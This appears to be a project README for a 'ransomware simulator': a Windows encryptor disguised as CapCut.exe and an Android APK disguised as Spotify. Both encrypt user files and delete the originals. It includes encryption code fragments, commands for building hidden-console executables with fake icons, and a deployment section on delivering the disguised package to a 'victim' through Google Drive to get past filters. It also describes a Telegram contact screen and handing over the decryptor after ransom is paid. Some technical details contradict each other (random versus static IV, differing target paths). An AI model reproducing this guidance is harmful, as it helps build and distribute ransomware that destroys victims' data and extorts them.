# **Ransomware Simulator**
## **Summary**
**Ransomware Simulator** is a cross-platform educational project designed to demonstrate the **behavior**, **design**, and **mechanism** of modern ransomware in a controlled and ethical environment.  
The project showcases **real-world ransomware functionalities**, including **targeted file encryption** and **decryption**, while maintaining a clear boundary for **cybersecurity training** and **awareness purposes**.

---

## **Key Components of the Project**

- **Android Ransomware APK (Disguised as Spotify):**  
  Simulates ransomware behavior on Android devices by **encrypting a predefined file** using **AES-256 CBC encryption**.  
  Includes a separate **Decryptor APK** to safely reverse the process using the correct password.

- **Windows Ransomware EXE (Disguised as CapCut):**  
  Provides the same simulation for Windows environments, **encrypting all files within a specific directory** and generating **.encrypted** file extensions.  
  A separate **Decryptor EXE** allows safe restoration.

- **AES-256 CBC Encryption:**  
  Both platforms implement robust **Advanced Encryption Standard (AES)** with **Cipher Block Chaining (CBC)** mode, paired with **SHA-256 for password hashing** to ensure secure simulation.

- **Controlled File Targeting:**  
  Encryption and decryption are **limited to specific folders or files**, minimizing unintended damage and focusing on demonstration.

- **Disguised UI and File Naming:**  
  Real-world mimicry through branding like **Spotify (Android)** and **CapCut (Windows)** to raise awareness about **social engineering tactics** in ransomware attacks.

---

## **Disclaimer**

This simulator is intended strictly for **ethical**, **educational**, and **cybersecurity awareness** purposes, helping **learners**, **researchers**, and **professionals** understand how ransomware operates **without causing real harm**.

# **Architecture Diagram**
## **Windows Ransomware Architecture Diagram**
![Windows Ransomware Architecture Diagram](./apk%20files%20%20AND%20exe%20Files/Windos_Arch.jpg)
## **Android Ransomware(Encryptor) Architecture Diagram**
![Android Ransomware(Encryptor) Architecture Diagram](./apk%20files%20%20AND%20exe%20Files/Enc_Arch.jpg)
## **Android Ransomware(Decryptor) Architecture Diagram**
![Android Ransomware(Decryptor) Architecture Diagram](./apk%20files%20%20AND%20exe%20Files/Decr_Arch.jpg)


# **CapCut.exe (Windows Ransomware(Encryptor))**

This component is a Python-based ransomware encryptor disguised as CapCut.exe. It is designed for educational use to demonstrate how ransomware encrypts files using AES-256 encryption. The program encrypts files in a specified folder or a specific file and deletes the original version.

---

## **Overview**

| **Property** | **Details** |
|--------------|--------------|
| **File Name** | CapCut.exe (created from Python script) |
| **Language** | Python |
| **Encryption Type** | AES-256 (CBC Mode) |
| **Password** | "FaizShiv200@123" |
| **Output Extension** | .encrypted |
| **Platform** | Windows |
| **Compiled Using** | PyInstaller |

---

## **How It Works – Step-by-Step**

### **Step 1: Define Target Path**

```python
file_to_encrypt = r"C:\Important_File"  # File or Folder path
```
### **Step 2: Generate AES-256 Key**

A 256-bit encryption key is generated using SHA-256 from the given password:

```python
def get_aes_key(password):
    hasher = SHA256.new(password.encode())
    return hasher.digest()
This ensures consistent and strong encryption.
```
---

### **Step 3: Encrypt File Content**

For each file:
- The file is read.
- Data is padded to fit AES block size.
- A random IV is generated.
- Data is encrypted using AES in CBC mode.
- The IV is added to the beginning of the encrypted file.

```python
iv = Random.new().read(AES.block_size)
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted_data = iv + cipher.encrypt(padded_data)
The encrypted file is saved as:
```
The encrypted file is saved as:
###  Step 4: Handle Files and Folders

The program checks if the given path is a file or folder:

- If it's a file ➜ encrypt it.
- If it's a folder ➜ loop through all files inside and encrypt each.

```python
if os.path.isfile(path):
    encrypt_file(path)
elif os.path.isdir(path):
    for root, dirs, files in os.walk(path):
        ...
```

##### **Example**
The input is: C:\Important_File\photo.jpg  

Output after encryption: C:\Important_File\photo.jpg.encrypted\n  

**The original photo.jpg is deleted.**  
###  Convert to .exe using PyInstaller

To turn the script into an .exe named **CapCut.exe**:  
**pyinstaller --onefile --noconsole encryptor.py -n CapCut.exe**  

- `--onefile`: Bundle everything in a single executable.  
- `--noconsole`: Hides the command prompt window.  
- `-n CapCut.exe`: Sets the output file name.  

---

###  Educational Purpose

 This encryptor is strictly for educational use in a controlled environment to understand how ransomware works.

- Demonstrates encryption workflow using AES.
- Shows how files can be programmatically locked and disguised.
- Useful for learning cybersecurity defense techniques.
### Important Notes
This script does not include a decryptor.
Encrypted files cannot be opened without the key.
IV is stored inside the encrypted file itself (at the beginning).


# Decoder.exe(Windows Ransomware(Decryptor))

### Overview

This Python script is used to decrypt files or folders that were previously encrypted using AES-256-CBC encryption (from the CapCut encryptor). The decryption is based on a static password and a proper unpadding mechanism. Later, this script was converted to an executable (decoder.exe) using PyInstaller so that it can be used easily on Windows systems without requiring Python to be installed.

### Tools & Technologies Used

- Python
- PyCryptodome (for AES encryption/decryption)
- PyInstaller (to convert Python script to .exe)
- AES-256 CBC (encryption mode)
- SHA-256 (to generate a secure 256-bit key from the password)

### How It Works (Step-by-Step)

#### 1. Target Selection
```python
file_to_decrypt = r"C:\Important_File"
```
This is the path to the file or folder you want to decrypt.

- It can be a single file or a full folder.
- The script will only process files that have a `.encrypted` extension.

---

### 2. Password & Key Generation

```python
password = "FaizShiv200@123"

def get_aes_key(password):
    hasher = SHA256.new(password.encode())
    return hasher.digest()
```
The password is used to generate a 256-bit AES key using SHA-256 hashing.

- This key must match the one used during encryption.
- The key is used to initialize the AES decryptor.

---

### 3. File Decryption Function

```python
def decrypt_file(file_path):
    ...
```
For each `.encrypted` file:

- Reads the file content.
- Extracts the IV (Initialization Vector) from the first 16 bytes.
- Initializes AES decryptor in CBC mode with the IV and the key.
- Decrypts the remaining data (actual content).
- Calls the `unpad()` function to remove padding.
- Writes the decrypted data to a new file (removes `.encrypted` from the filename).
- Deletes the original encrypted file.

---

### 4. Unpadding Function

```python
def unpad(data):
    padding = data[-1]
    return data[:-padding]
```
- During encryption, padding bytes were added to match AES block size.  
- This function removes that padding after decryption, restoring the original file content.

---

### 5. Process Path Function

```python
def process_path(path):
    ...
```
- If the path is a single file → it attempts to decrypt that file.
- If the path is a directory:
  - It walks through all subfolders and files.
  - Calls `decrypt_file()` for each `.encrypted` file found.

---

### 6. Execution

```python
process_path(file_to_decrypt)
```
This line triggers the full decryption process.

All matching `.encrypted` files are processed.

---

### Conversion to EXE (Optional but Done)

To make it executable on Windows without needing Python installed:

```bash
pyinstaller --onefile --noconsole decoder.py
```
- `--onefile` → Creates a single portable `.exe` file.
- `--noconsole` → Prevents showing a command prompt window during execution.
The final executable:

`decoder.exe` (Disguised as CapCut app)

---

### Summary of Features

| Feature | Description |
|--------|-------------|
| Target | Single file or full folder with `.encrypted` files |
| Algorithm | AES-256 in CBC mode |
| Key Derivation | SHA-256 from static password |
| IV Handling | First 16 bytes of each file |
| File Output | Decrypted file saved with original name |
| Original File Removal | Deletes `.encrypted` file after successful decryption |
| Error Handling | Catches and prints error if decryption fails |
| Final Packaging | Converted to `.exe` using PyInstaller |  


# Spotify.apk(Android Ransomware(Encryptor))

This module simulates a ransomware attack on Android by disguising a malicious Flutter application as the popular Spotify app. The primary purpose of this module is to educate and demonstrate how attackers can abuse trusted brand identities and sensitive permissions to silently encrypt user files—in this case, WhatsApp profile photos.

## Summary

| Component | Description |
|-----------|-------------|
| App Name | Spotify (disguised ransomware) |
| Language/SDK | Dart (Flutter Framework) |
| Package Type | Android APK |
| Target Directory | /storage/emulated/0/WhatsApp/Media/WhatsApp Profile Photos/ |
| Encryption Algorithm | AES-256 CBC |
| Password | FaizShiv200@123 (converted to key via SHA-256) |
| Permissions | MANAGE_EXTERNAL_STORAGE |
| Trigger | Automatic encryption on app launch |
| Output File | Original files renamed with .enc extension |

## Core Logic Overview

The fake Spotify APK is a full Dart (Flutter) application that performs silent encryption of all image files inside the WhatsApp profile photo directory when launched.

### Key Generation (Dart)

```dart
final password = "FaizShiv200@123";
final key = sha256.convert(utf8.encode(password)).bytes;
final keySpec = encrypt.Key(Uint8List.fromList(key));
```

### IV Generation

```dart
final ivBytes = encrypt.IV.fromSecureRandom(16);
```

### Encryption Flow

```dart
final encrypter = encrypt.Encrypter(encrypt.AES(keySpec, mode: encrypt.AESMode.cbc));
final encrypted = encrypter.encryptBytes(file.readAsBytesSync(), iv: ivBytes);
```

### Save Encrypted Files

```dart
final encryptedFile = File('${file.path}.enc');
encryptedFile.writeAsBytesSync(ivBytes.bytes + encrypted.bytes);
file.deleteSync(); // Optional: delete original file
```

## Target Directory

This module recursively searches for `.jpg`, `.jpeg`, `.png` files in the following WhatsApp directory:

```
/storage/emulated/0/WhatsApp/Media/WhatsApp Profile Photos/
```

As soon as the fake app (Spotify) is launched, the encryption begins without user interaction.

## Required Android Permissions

```xml
<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
```

To enable full storage access, the app uses:

```dart
await AndroidIntent(
  action: 'android.settings.MANAGE_ALL_FILES_ACCESS_PERMISSION',
).launch();
```

This allows the ransomware to access, encrypt, and delete any files in the internal storage freely.

## Educational Focus

This module helps in understanding:

- The risk of sideloading APKs from unknown sources.
- How legitimate-looking apps (like Spotify) can mask malicious intent.
- How ransomware targets sensitive folders like WhatsApp.
- How AES-256 CBC works with key + IV combo.
- The impact of granting full storage permission to unknown apps.
# Decryptor.apk(Android Ramsomware(Decryptor))

This module is the counterpart to the fake Spotify Encryptor APK created using Flutter (Dart). It simulates a ransomware recovery utility that decrypts AES-256 CBC encrypted files, specifically WhatsApp profile photos, on Android devices. It uses the same key ("FaizShiv200@123") used during encryption and requires access to external storage.

The app is disguised as a File Recovery Tool, but its real functionality is to manually or automatically decrypt files encrypted by the ransomware module.

## Summary

| Component | Description |
|-----------|-------------|
| App Name | File Recovery Tool (Disguised Decryptor) |
| Platform | Android (Flutter/Dart-based) |
| Target File(s) | /storage/emulated/0/Android/media/com.whatsapp/Profile Photos/*.enc |
| Decryption Algo | AES-256 in CBC mode |
| Key | "FaizShiv200@123" (hardcoded and hashed with SHA-256) |
| Trigger | Decryption on app launch (manual or automatic) |
| Output File | Restored image (original file name without .enc) |
| Permissions | MANAGE_EXTERNAL_STORAGE, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE |

## Core Logic Overview (in Dart)

### Password Derivation

```dart
import 'dart:convert';
import 'package:crypto/crypto.dart';
import 'package:encrypt/encrypt.dart';

final password = 'FaizShiv200@123';
final keyBytes = sha256.convert(utf8.encode(password)).bytes;
final key = Key(Uint8List.fromList(keyBytes));
```

### Read Encrypted File and Extract IV

```dart
final fileBytes = await encryptedFile.readAsBytes();
final iv = IV(fileBytes.sublist(0, 16));
final encryptedData = Encrypted(fileBytes.sublist(16));
```

### Decrypt Content

```dart
final encrypter = Encrypter(AES(key, mode: AESMode.cbc));
final decryptedBytes = encrypter.decryptBytes(encryptedData, iv: iv);
```

### Restore Original File

```dart
final outputFilePath = encryptedFile.path.replaceAll('.enc', '');
final outputFile = File(outputFilePath);
await outputFile.writeAsBytes(decryptedBytes);
```

## Target File(s)

The decryptor scans:

```
/storage/emulated/0/Android/media/com.whatsapp/Profile Photos/*.enc
```

Each file with a `.enc` extension is decrypted and restored to:

```
/storage/emulated/0/Android/media/com.whatsapp/Profile Photos/<original_filename>.jpg
```

## Required Android Permissions

Add the following permissions in `AndroidManifest.xml`:

```xml
<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
```

In Android 11+ you must also request permissions dynamically using `Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION`.

## Educational Focus

This module demonstrates:

- Secure AES-256 CBC decryption in a real-world mobile simulation.
- The importance of key and IV integrity for successful decryption.
- How ransomware can be reversed if the key is preserved.
- The concept of file scanning and targeted decryption within app directories.
- Simulates real-world decryption tools disguised as helpful utilities.


# Deployment

## Objective:
To organize and deploy all 4 components of the ransomware project effectively across both Android and Windows platforms, making it easy to execute, disguise, share, and manage.

## Prerequisites
Before you begin, make sure you have the following:

- Basic understanding of Android APK building and Flutter environment
- Basic understanding of Windows .exe packaging (using PyInstaller)
- Android device or emulator for testing APKs
- Windows OS for testing .exe files
- Internet access to upload your files (e.g. Mediafire, Mega, etc.)
- Telegram ID ready (if you're planning to add it in the placeholder screens)

---

## 1. Android Deployment – Spotify Encryptor & Decryptor APK

### Spotify Encryptor APK:
- **Technology Used:** Dart (Flutter)
- **Target Folder:**  
  `/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Profile Photos`

#### Workflow:
- When the app is launched, it first asks for `MANAGE_EXTERNAL_STORAGE` permission.
- After permission is granted, it scans the WhatsApp profile photo folder.
- All found image files are encrypted using AES-256 CBC encryption.
- The encrypted files are saved with a `.enc` extension.
- The original image files are securely deleted.
- A dummy screen is shown that displays a Telegram contact for further help (to get files decrypted).

#### Deployment Steps:
Compiled using:
```bash
flutter build apk --release
```
## Spotify Decryptor APK:
**Technology Used:** Dart (Flutter)  
**Target:** `.enc` files from WhatsApp Profile Photo folder.

### Workflow:
- Scans the same WhatsApp Profile Photo folder.
- Detects `.enc` files.
- Extracts the IV (Initialization Vector) from each file.
- Decrypts the file using the same AES password.
- Restores the original image.
- Deletes the encrypted `.enc` file after successful decryption.

### Deployment:
Compiled as `decryptor.apk` using:
```bash
flutter build apk --release
```
Shared only after ransom is paid or for testing demonstration purposes.

## 2. Windows Deployment – CapCut Encryptor EXE & Decryptor EXE

### CapCut Encryptor EXE:
**Technology Used:** Python + PyInstaller  
**Target Folder:** `C:\Important_File` or any user-chosen sensitive folder

### Workflow:
Written using `pycryptodome` library to apply AES-256 CBC encryption.

Each target file is encrypted:
- IV is prepended to the encrypted content.
- Original file is deleted.
- Output files are saved with `.encrypted` extension.

### Deployment Steps:
Compiled into EXE using:
```bash
pyinstaller --onefile --noconsole --icon=capcut.ico capcut.py
```
EXE file is renamed to `capcut.exe` and icon changed to mimic CapCut installer.

Then, `capcut.exe` and `decoder.exe` are both compressed into a ZIP file.

The ZIP file is uploaded to Google Drive with public sharing enabled.

Victim is given a Google Drive link (disguised as CapCut software installer).

---

## CapCut Decryptor EXE:
**Technology Used:** Python + PyInstaller  

### Function:
- Scans for `.encrypted` files in the same folder.
- Extracts IV and decrypts using AES password.
- Original files are restored and `.encrypted` files are deleted.

### Deployment:
- Compiled into `decoder.exe` using PyInstaller.
- Delivered together with `capcut.exe` in the same ZIP file uploaded to Google Drive.
- Shared with victim once payment is confirmed or for demonstration purposes.

---

## Google Drive Sharing for Windows Files:
Both `capcut.exe` and `decoder.exe` are:
- Bundled into a ZIP file.
- Uploaded to Google Drive with "Anyone with the link can view" permission.
- Shared with victim as a fake CapCut installer package to trick them into running the ransomware.

This technique helps bypass email/file upload restrictions and increases trust since Google Drive is commonly trusted.

---

## Final Testing Checklist:
Before deployment, test all functionalities:
- Ensure `Spotify.apk` successfully encrypts WhatsApp profile photos.
- Ensure `decryptor.apk` restores them properly.
- Verify `capcut.exe` encrypts files and deletes originals correctly.
- Ensure `decoder.exe` decrypts and restores files fully.
- Confirm all paths, permissions, and AES keys match across encryptors and decryptors.
- Make sure icons and names are correctly disguised.

---

## Important Note:
This project is intended strictly for educational and research purposes only.  
Do not deploy or use this code for any unethical, illegal, or malicious activities.  
Misuse of this information may lead to serious legal consequences.

# Requirements for Ransomware Simulation Project (Spotify + CapCut Encryptor/Decryptor)

| Name | Version / Toolchain | Description |
|------|----------------------|-------------|
| Flutter SDK | >= 3.10.0 | Used for developing cross-platform Android apps (Spotify Encryptor/Decryptor) |
| Dart | >= 2.18.0 | Language used in Flutter for implementing encryption logic |
| Visual Studio Code | Latest | IDE used for writing and debugging Flutter/Dart code |
| Android SDK | >= 31 (Android 12+) | Required to build and run Android APKs (targeting WhatsApp profile photos) |
| Windows (EXE) | Windows 10/11 | Target platform for CapCut.exe ransomware simulator |
| Python | >= 3.10.0 (optional) | Used in some utilities (e.g., key generation or automation scripts) |
| pyinstaller | >= 5.9.0 | For converting Python scripts into CapCut.exe binary |
| AES Encryption | AES-256 CBC Mode | Core algorithm used for encrypting/decrypting files in both platforms |
| Shared Password | "FaizShiv200@123" | Common key used for encryption/decryption across platforms |
| File Targeting | Android: /Pictures/Digital-Promotion-Agency.png <br> Windows:C:\Important_File | Target files/folders for encryption |
| Permissions | MANAGE_EXTERNAL_STORAGE | Required in Android for accessing WhatsApp profile photos |
| Icons & UI | Fake App Icons (Spotify, CapCut) | Used to disguise the ransomware as real apps |

# Modules Used in the Project

This cross-platform ransomware project utilizes several Dart, Flutter, and system-level modules to implement encryption, disguise, platform-specific permissions, and file handling functionalities. The project is divided into Android and Windows components, each tailored with relevant modules.

## Dart/Flutter Modules

| Module / Package | Purpose / Usage |
|------------------|-----------------|
| encrypt | Provides AES-256 CBC encryption and decryption functionalities |
| crypto | Used for hashing the encryption password using SHA-256 or PBKDF2 |
| path_provider | Locates system directories such as /Pictures/WhatsApp/ or desktop folders |
| permission_handler | Requests storage access permissions like MANAGE_EXTERNAL_STORAGE on Android |
| file | Facilitates reading from and writing to files during encryption/decryption |
| dart:convert | Enables Base64 and UTF-8 encoding/decoding required for encryption |
| dart:io | Provides access to local files, directories, and I/O operations |
| window_manager | Hides or customizes window elements in desktop applications (used for disguise) |
| process_run (optional) | Executes background or shell commands, especially for setup tasks |
| flutter_launcher_icons | Sets custom icons (e.g., Spotify, CapCut) to disguise the application |
| inno_setup_compiler | Packages the Windows application as an .exe installer with custom icon |

## Internal Modules and Folders

| Folder / Custom Module | Description |
|-------------------------|-------------|
| /encryption/ | Contains core logic for AES encryption and decryption (encrypt.dart, decrypt.dart) |
| /android_disguise/ | Holds the Flutter-based Android interface disguised as the Spotify app |
| /windows_disguise/ | Flutter desktop code mimicking CapCut app for the ransomware GUI |
| /decryptor_apk/ | Android APK that reverses encryption using the same AES key and IV |
| /decryptor_exe/ | Decryptor executable file for Windows that restores encrypted data |
| /assets/ | Contains static files like icons, dummy images, and UI assets |
| /utils/ | Utility functions such as key generation, file scanning, and logging |
# Resources
# App-Level Resources (Assets and Configuration)

## Resource Overview

| Resource | Description |
|----------|-------------|
| pubspec.yaml | Defines project dependencies, assets, and icon configuration |
| AndroidManifest.xml | Declares permissions such as MANAGE_EXTERNAL_STORAGE |
| Info.plist (for iOS builds) | (Optional) Placeholder for platform compatibility |
| inno_setup_script.iss | Script used to generate Windows .exe installer with custom icon |
| main.dart | Entry point for Flutter applications (both encryptor and decryptor) |
| launcher_icon.png | Custom launcher icon (Spotify/CapCut), configured using flutter_launcher_icons |

## Encryption-Specific Resources

| Resource | Role in Encryption |
|----------|--------------------|
| Encryption Password | "FaizShiv200@123" — Hardcoded key for AES encryption and decryption |
| AES Mode | AES-256 CBC with PKCS7 padding and static IV |
| Key Derivation | SHA-256 hash of the password to generate 256-bit key |
| IV (Initialization Vector) | Fixed 128-bit IV used for encryption consistency across files |
| Base64 Encoding | Converts encrypted binary data to storable strings |

## Android Permissions Used

| Permission | Purpose |
|------------|---------|
| MANAGE_EXTERNAL_STORAGE | Allows access to all external files for encryption and decryption |
| READ_EXTERNAL_STORAGE (Optional) | Backward compatibility for older Android versions |
| INTERNET (Optional) | If logging or reporting is integrated (not included in current build) |

# App-Level Resources (Executable Build System & File Structure)

| Resource | Description |
|----------|-------------|
| encryptor.py | Python script to encrypt targeted files or folders using AES-256 (CBC mode). |
| decryptor.py | Python script to decrypt .encrypted files back to original state. |
| pyinstaller | Used to convert Python scripts into standalone .exe executables. |
| CapCut.ico | Custom icon used to disguise the executable as the CapCut video editor. |
| CapCut_Encryptor.exe | Final output of encryptor.py, disguised as CapCut app (installer/executable). |
| CapCut_Decryptor.exe | Decryption executable built from decryptor.py. |
| config.spec | PyInstaller specification file for advanced build options (icon, paths, etc.). |
| README.txt | Instructions for using the encryptor and decryptor. |
| ransom_note.txt (optional) | Optional text file displayed to user after encryption. |
| Google Drive (ZIP folder) | Final package sent to victim — includes EXE with disguise and instructions. |

# Encryption-Specific Configuration

| Configuration Element | Details |
|-----------------------|---------|
| Encryption Algorithm | AES-256 in CBC (Cipher Block Chaining) mode |
| Key Derivation Function | SHA-256 hashing of user-defined password to generate 256-bit encryption key |
| Padding Scheme | PKCS7 padding for byte alignment |
| IV (Initialization Vector) | Randomly generated 128-bit IV per encryption instance |
| File Extension | .encrypted is added to the encrypted files |
| Target Path | Hardcoded or user-defined path such as C:\Important_File |
| Password Used | "FaizShiv200@123" (Hardcoded) |

# Windows Execution Flow

**Encryption:**

- `encryptor.py` is compiled into `CapCut_Encryptor.exe` using PyInstaller.
- When run, it encrypts all files under a specified directory (recursively).
- Original files are deleted after encryption to avoid recovery.

**Decryption:**

- `decryptor.py` is compiled into `CapCut_Decryptor.exe`.
- It scans for `.encrypted` files in the specified folder.
- Decrypts and restores the original content using the same password and AES configuration.

# Packaging & Delivery

| Step | Action |
|------|--------|
| 1 | Both EXE files are compiled and renamed to resemble legitimate software. |
| 2 | Files are zipped together (optional: with fake README or license). |
| 3 | ZIP is uploaded to Google Drive or any delivery medium. |
| 4 | Victim downloads and executes assuming it is CapCut or another safe app. |

# Project Input and Output

## Android Ransomware (Spotify.apk & Decryptor.apk)

###  Input:

| Input Type | Description |
|------------|-------------|
| Target File/Folder Path | Predefined in code (e.g., /storage/emulated/0/WhatsApp/Profile Photos/) |
| Encryption Password | Hardcoded as "FaizShiv200@123" (used for both encryption and decryption) |
| User Permission | MANAGE_EXTERNAL_STORAGE permission requested on app launch |
| App Launch Trigger | App launch automatically begins encryption or decryption process |

###  Output:

| Output Type | Description |
|-------------|-------------|
| Encrypted Files | Original files replaced with encrypted versions having .encrypted suffix |
| File Deletion | Original unencrypted files are deleted after encryption |
| Decrypted Files | Encrypted files restored to original state by Decryptor.apk |
| UI Output (Optional) | Basic confirmation toast or logs on success/failure (can be expanded) |

---

## Windows Ransomware (CapCut Encryptor.exe & Decryptor.exe)

###  Input:

| Input Type | Description |
|------------|-------------|
| Target Folder Path | Specified in script (e.g., C:\Important_File) |
| Encryption Password | Hardcoded as "FaizShiv200@123" |
| App Launch Trigger | Running the EXE file starts the process (silent or command-line based) |
| Installer Resources | Icon, setup file created via Inno Setup Script |

###  Output:

| Output Type | Description |
|-------------|-------------|
| Encrypted Files | Files in the target folder get encrypted with .encrypted extension |
| Decrypted Files | EXE decryptor restores original file contents from encrypted files |
| Deleted Originals | Like Android, original files are removed post-encryption |
| Console Output (Optional) | If enabled, success/failure messages shown via command-line or pop-up logs |
